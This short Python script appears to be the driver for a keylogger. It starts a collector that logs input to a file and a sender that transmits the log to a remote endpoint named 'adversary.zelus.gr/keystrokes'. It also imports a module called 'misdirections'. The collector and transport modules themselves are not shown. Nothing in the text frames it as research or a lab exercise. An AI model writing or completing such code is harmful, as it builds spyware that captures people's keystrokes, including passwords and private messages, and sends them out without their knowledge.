import osutils
import collector
import transport
import misdirections 

logfile = osutils.get_log_path()

c = collector.Collector(logfile=logfile)
c.start()

sender = transport.Sender(remote="http://adversary.zelus.gr/keystrokes", logfile=logfile)
sender.start()

c.join()
sender.join()